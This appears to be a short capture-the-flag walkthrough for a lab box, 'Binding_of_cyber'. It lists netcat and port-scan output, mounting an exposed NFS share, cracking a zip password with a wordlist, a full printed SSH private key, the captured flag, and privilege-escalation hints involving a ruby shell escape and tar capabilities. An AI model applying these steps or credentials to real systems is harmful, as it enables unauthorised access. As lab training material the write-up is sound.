Binding_of_cyber

./script.sh

(UNKNOWN) [10.10.142.181] 51 (?) open
550 12345 ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄(UNKNOWN) [10.10.142.181] 52 (?) open
550 12345 ⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣄⣀⠄⠄⠄⠄⠄⠄⠄g⠄(UNKNOWN) [10.10.142.181] 53 (domain) open
550 12345 ⠄⠄⠄⠄⠄⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠄⠄⠄⠄o⠄(UNKNOWN) [10.10.142.181] 54 (?) open
550 12345 ⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠄⠄⠄⠄(UNKNOWN) [10.10.142.181] 55 (?) open
550 12345 ⠄⠄⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠄p⠄(UNKNOWN) [10.10.142.181] 56 (?) open
550 12345 ⠄⠄⣾⣿⡿⠟⡋⠉⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠉⠙⠻⣿⣿⣇o⠄(UNKNOWN) [10.10.142.181] 57 (?) open
550 12345 ⠄⢠⣿⡏⢰⣿⣿⡇⠄⠄⢸⣿⣿⣿⠿⠿⣿⣿⣿⠁⣾⣿⣷⠄⠄⠘⣿⣿r⠄(UNKNOWN) [10.10.142.181] 58 (?) open
550 12345 ⠄⠸⣿⣇⠈⠉⠉⠄⠄⢀⣼⡿⠋⠄⠄⠄⠄⠙⢿⣄⠙⠛⠁⠄⠄⢠⣿⣿t⠄(UNKNOWN) [10.10.142.181] 59 (?) open
550 12345 ⠄⠄⢿⣿⡇⠄⠄⠄⣶⣿⣿⢁⣤⣤⣤⣤⣤⣤⠄⣿⣷⠄⠄⠄⠈⢹⣿⡟⠄⠄(UNKNOWN) [10.10.142.181] 60 (?) open
550 12345 ⠄⠄⠈⢿⡗⠄⠄⢸⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⠄⠄⠄⠄⢸⡟⠄2⠄(UNKNOWN) [10.10.142.181] 61 (?) open
550 12345 ⠄⠄⠄⠄⠳⡀⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠌⠄⠄3⠄(UNKNOWN) [10.10.142.181] 62 (?) open
550 12345 ⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⠄⠄⠄⠄⠄⠄4⠄(UNKNOWN) [10.10.142.181] 63 (?) open
550 12345 ⠄⠄⠄⠄⠄⠄⠄⠄⠉⠙⠻⠿⠿⣿⣿⣿⣿⠿⠿⠛⠉⠄⠄⠄⠄⠄⠄⠄5⠄(UNKNOWN) [10.10.142.181] 64 (?) open
550 12345 ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄6⠄(UNKNOWN) [10.10.142.181] 65 (?) open

└─$ nc 10.10.142.181 23456                 
It remember ! I put the flags in my chest, it's on a nfs share, how do i list them ? 

2049/tcp  open  nfs

└─$ showmount -e 10.10.142.181

Export list for 10.10.142.181:
/home/nfs *

└─$ sudo mount -t nfs 10.10.142.181:/home/nfs /tmp -nolock

└─$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u chest.zip 

PASSWORD FOUND!!!!: pw == isaaciscrazy

go in a directory where is have the correct right because the right of /tmp are weird now cause of the mount.

unzip -P "isaaciscrazy" /tmp/

cd /home/isaac/.ssh

cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
xa0G3rSKDYMAAAAKaGFkZXNAaGVsbAE=
-----END OPENSSH PRIVATE KEY-----

connect on ssh as isac

cat flag.txt : EPI{4ch13V3M3N7_7R0Phy_90lD3n_90d}

cat hint.txt : 5000-6500 (some ports obviously)

Escape from the ruby shell using system. Find that tar are setcapabilities set (found with linpeas)